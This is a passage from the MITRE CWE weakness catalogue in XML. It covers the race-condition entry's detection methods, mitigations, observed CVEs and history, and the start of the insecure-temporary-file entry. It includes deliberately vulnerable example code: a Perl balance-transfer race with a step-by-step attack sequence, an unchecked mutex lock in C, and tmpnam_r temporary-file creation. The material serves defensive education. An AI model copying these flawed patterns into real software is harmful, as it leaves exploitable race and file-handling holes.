                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>In languages that support it, use synchronization primitives. Only wrap these around critical code to minimize the impact on performance.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use thread-safe capabilities such as the data access abstraction in Spring.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Minimize the usage of shared resources in order to remove as much complexity as possible from the control flow and to reduce the likelihood of unexpected conditions occurring.</xhtml:p>
                  <xhtml:p>Additionally, this will minimize the amount of synchronization necessary and may even help to reduce the likelihood of a denial of service where an attacker may be able to repeatedly trigger a critical section (CWE-400).</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When using multithreading and operating on shared variables, only use thread-safe functions.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use atomic operations on shared variables. Be wary of innocent-looking constructs such as "x++". This may appear atomic at the code layer, but it is actually non-atomic at the instruction layer, since it involves a read, followed by a computation, followed by a write.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use a mutex if available, but be sure to avoid related weaknesses such as CWE-412.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Avoid double-checked locking (CWE-609) and other implementation errors that arise when trying to avoid the overhead of synchronization.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Disable interrupts or signals over critical parts of the code, but also make sure that the code does not go into a large or infinite loop.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use the volatile type modifier for critical variables to avoid unexpected compiler optimization or reordering. This does not necessarily solve the synchronization problem, but it can help.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code could be used in an e-commerce application that supports transfers between accounts. It takes the total amount of the transfer, sends it to the new account, and deducts the amount from the original account.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>$transfer_amount = GetTransferAmount();<xhtml:br/>$balance = GetBalanceFromDatabase();<xhtml:br/>
                     <xhtml:br/>if ($transfer_amount &lt; 0) {<xhtml:div style="margin-left:1em;">FatalError("Bad Transfer Amount");</xhtml:div>}<xhtml:br/>$newbalance = $balance - $transfer_amount;<xhtml:br/>if (($balance - $transfer_amount) &lt; 0) {<xhtml:div style="margin-left:1em;">FatalError("Insufficient Funds");</xhtml:div>}<xhtml:br/>SendNewBalanceToDatabase($newbalance);<xhtml:br/>NotifyUser("Transfer of $transfer_amount succeeded.");<xhtml:br/>NotifyUser("New balance: $newbalance");</xhtml:div>
               </Example_Code>
               <Body_Text>A race condition could occur between the calls to GetBalanceFromDatabase() and SendNewBalanceToDatabase().</Body_Text>
               <Body_Text>Suppose the balance is initially 100.00. An attack could be constructed as follows:</Body_Text>
               <Example_Code Nature="Attack" Language="Other">
                  <xhtml:div>In the following pseudocode, the attacker makes two simultaneous calls of the program, CALLER-1 and CALLER-2. Both callers are for the same user account.<xhtml:br/>CALLER-1 (the attacker) is associated with PROGRAM-1 (the instance that handles CALLER-1). CALLER-2 is associated with PROGRAM-2.<xhtml:br/>CALLER-1 makes a transfer request of 80.00.<xhtml:br/>PROGRAM-1 calls GetBalanceFromDatabase and sets $balance to 100.00<xhtml:br/>PROGRAM-1 calculates $newbalance as 20.00, then calls SendNewBalanceToDatabase().<xhtml:br/>Due to high server load, the PROGRAM-1 call to SendNewBalanceToDatabase() encounters a delay.<xhtml:br/>CALLER-2 makes a transfer request of 1.00.<xhtml:br/>PROGRAM-2 calls GetBalanceFromDatabase() and sets $balance to 100.00. This happens because the previous PROGRAM-1 request was not processed yet.<xhtml:br/>PROGRAM-2 determines the new balance as 99.00.<xhtml:br/>After the initial delay, PROGRAM-1 commits its balance to the database, setting it to 20.00.<xhtml:br/>PROGRAM-2 sends a request to update the database, setting the balance to 99.00</xhtml:div>
               </Example_Code>
               <Body_Text>At this stage, the attacker should have a balance of 19.00 (due to 81.00 worth of transfers), but the balance is 99.00, as recorded in the database.</Body_Text>
               <Body_Text>To prevent this weakness, the programmer has several options, including using a lock to prevent multiple simultaneous requests to the web application, or using a synchronization mechanism that includes all the code between GetBalanceFromDatabase() and SendNewBalanceToDatabase().</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-24">
               <Intro_Text>The following function attempts to acquire a lock in order to perform operations on a shared resource.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>void f(pthread_mutex_t *mutex) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>pthread_mutex_lock(mutex);<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>/* access shared resource */</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:br/>pthread_mutex_unlock(mutex);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior.</Body_Text>
               <Body_Text>In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels.</Body_Text>
               <Example_Code Nature="Good" Language="C">
                  <xhtml:div>int f(pthread_mutex_t *mutex) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>int result;<xhtml:br/>
                           <xhtml:br/>result = pthread_mutex_lock(mutex);<xhtml:br/>if (0 != result)<xhtml:div style="margin-left:1em;">return result;</xhtml:div>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>/* access shared resource */</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:br/>return pthread_mutex_unlock(mutex);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-132">
	       <Intro_Text>Suppose a processor's Memory Management Unit (MMU) has 5 other shadow MMUs to distribute its workload for its various cores. Each MMU has the start address and end address of "accessible" memory. Any time this accessible range changes (as per the processor's boot status), the main MMU sends an update message to all the shadow MMUs.</Intro_Text>
	       <Body_Text>Suppose the interconnect fabric does not prioritize such "update" packets over other general traffic packets. This introduces a race condition. If an attacker can flood the target with enough messages so that some of those attack packets reach the target before the new access ranges gets updated, then the attacker can leverage this scenario.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-29527</Reference>
               <Description>Go application for cloud management creates a world-writable sudoers file that allows local attackers to inject sudo rules and escalate privileges to root by winning a race condition.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29527</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-1782</Reference>
               <Description>Chain: improper locking (CWE-667) leads to race condition (CWE-362), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-1782</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-0920</Reference>
               <Description>Chain: mobile platform race condition (CWE-362) leading to use-after-free (CWE-416), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-0920</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-6819</Reference>
               <Description>Chain: race condition (CWE-362) leads to use-after-free (CWE-416), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-6819</Link>
            </Observed_Example>
           <Observed_Example>
             <Reference>CVE-2019-18827</Reference>
             <Description>chain: JTAG interface is not disabled (CWE-1191) during ROM code execution, introducing a race condition (CWE-362) to extract encryption keys</Description>
             <Link>https://www.cve.org/CVERecord?id=CVE-2019-18827</Link>
           </Observed_Example>
            <Observed_Example>
            <Reference>CVE-2019-1161</Reference>
            <Description>Chain: race condition (CWE-362) in anti-malware product allows deletion of files by creating a junction (CWE-1386) and using hard links during the time window in which a temporary file is created and deleted.</Description>
            <Link>https://www.cve.org/CVERecord?id=CVE-2019-1161</Link>
            </Observed_Example>
            <Observed_Example>
            <Reference>CVE-2015-1743</Reference>
            <Description>TOCTOU in sandbox process allows installation of untrusted browser add-ons by replacing a file after it has been verified, but before it is executed</Description>
            <Link>https://www.cve.org/CVERecord?id=CVE-2015-1743</Link>
            </Observed_Example>
            <Observed_Example>
            <Reference>CVE-2014-8273</Reference>
            <Description>Chain: chipset has a race condition (CWE-362) between when an interrupt handler detects an attempt to write-enable the BIOS (in violation of the lock bit), and when the handler resets the write-enable bit back to 0, allowing attackers to issue BIOS writes during the timing window [REF-1237].</Description>
            <Link>https://www.cve.org/CVERecord?id=CVE-2014-8273</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5044</Reference>
               <Description>Race condition leading to a crash by calling a hook removal procedure while other activities are occurring at the same time.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5044</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2958</Reference>
               <Description>chain: time-of-check time-of-use (TOCTOU) race condition in program allows bypass of protection mechanism that was designed to prevent symlink attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2958</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1570</Reference>
               <Description>chain: time-of-check time-of-use (TOCTOU) race condition in program allows bypass of protection mechanism that was designed to prevent symlink attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1570</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0058</Reference>
               <Description>Unsynchronized caching operation enables a race condition that causes messages to be sent to a deallocated object.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0058</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0379</Reference>
               <Description>Race condition during initialization triggers a buffer overflow.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0379</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6599</Reference>
               <Description>Daemon crash by quickly performing operations and undoing them, which eventually leads to an operation that does not acquire a lock.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-6599</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6180</Reference>
               <Description>chain: race condition triggers NULL pointer dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-6180</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5794</Reference>
               <Description>Race condition in library function could cause data to be sent to the wrong process.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5794</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3970</Reference>
               <Description>Race condition in file parser leads to heap corruption.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-3970</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5021</Reference>
               <Description>chain: race condition allows attacker to access an object while it is still being initialized, causing software to access uninitialized memory.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5021</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4895</Reference>
               <Description>chain: race condition for an argument value, possibly resulting in NULL dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-4895</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3547</Reference>
               <Description>chain: race condition might allow resource to be released before operating on it, leading to NULL dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3547</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-5051</Reference>
               <Description>Chain: Signal handler contains too much functionality (CWE-828), introducing a race condition (CWE-362) that leads to a double free (CWE-415).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-5051</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Race Conditions</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>VNA03-J</Entry_ID>
               <Entry_Name>Do not assume that a group of calls to independently atomic methods is atomic</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="26"/>
            <Related_Attack_Pattern CAPEC_ID="29"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 13: Race Conditions.&#34; Page 205"/>
            <Reference External_Reference_ID="REF-349"/>
            <Reference External_Reference_ID="REF-350"/>
            <Reference External_Reference_ID="REF-351"/>
            <Reference External_Reference_ID="REF-352"/>
            <Reference External_Reference_ID="REF-353"/>
            <Reference External_Reference_ID="REF-354"/>
            <Reference External_Reference_ID="REF-355"/>
            <Reference External_Reference_ID="REF-356"/>
            <Reference External_Reference_ID="REF-357"/>
            <Reference External_Reference_ID="REF-76"/>
	    <Reference External_Reference_ID="REF-1237"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Maintenance">The relationship between race conditions and synchronization problems (CWE-662) needs to be further developed. They are not necessarily two perspectives of the same core concept, since synchronization is only one technique for avoiding race conditions, and synchronization can be used for other purposes besides race condition prevention.</Note>
            <Note Type="Research Gap">Race conditions in web applications are under-studied and probably under-reported. However, in 2008 there has been growing interest in this area.</Note>
            <Note Type="Research Gap">Much of the focus of race condition research has been in Time-of-check Time-of-use (TOCTOU) variants (CWE-367), but many race conditions are related to synchronization problems that do not necessarily require a time-of-check.</Note>
            <Note Type="Research Gap">From a classification/taxonomy perspective, the relationships between concurrency and program state need closer investigation and may be useful in organizing related issues.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Maintenance_Notes, Observed_Examples, Potential_Mitigations, References, Relationships, Research_Gaps</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Detection_Factors, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Name, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Research_Gaps, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Common_Consequences, Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-07-16</Modification_Date>
					<Modification_Version>4.15</Modification_Version>
					<Modification_ReleaseDate>2024-07-16</Modification_ReleaseDate>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>Martin Sebor</Contribution_Name>
               <Contribution_Organization>Cisco Systems, Inc.</Contribution_Organization>
               <Contribution_Date>2010-04-30</Contribution_Date>
               <Contribution_Comment>Provided Demonstrative Example</Contribution_Comment>
            </Contribution>
            <Previous_Entry_Name Date="2008-04-11">Race Conditions</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-12-13">Race Condition</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="377" Name="Insecure Temporary File" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>Creating and using insecure temporary files can leave application and system data vulnerable to attack.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Modify Files or Directories</Impact>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code uses a temporary file for storing intermediate data gathered from the network before it is processed.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>if (tmpnam_r(filename)) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>FILE* tmp = fopen(filename,"wb+");<xhtml:br/>while((recv(sock,recvbuf,DATA_SIZE, 0) &gt; 0)&amp;(amt!=0)) amt = fwrite(recvbuf,1,DATA_SIZE,tmp);</xhtml:div>
                     </xhtml:div>}<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This otherwise unremarkable code is vulnerable to a number of different attacks because it relies on an insecure method for creating temporary files. The vulnerabilities introduced by this function and others are described in the following sections. The most egregious security problems related to temporary file creation have occurred on Unix-based operating systems, but Windows applications have parallel risks. This section includes a discussion of temporary file creation on both Unix and Windows systems. Methods and behaviors can vary between systems, but the fundamental risks introduced by each are reasonably constant.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-41954</Reference>
               <Description>A library uses the Java File.createTempFile() method which creates a file with "-rw-r--r--" default permissions on Unix-like operating systems</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-41954</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Insecure Temporary File</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>CON33-C</Entry_ID>
               <Entry_Name>Avoid race conditions when using library functions</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
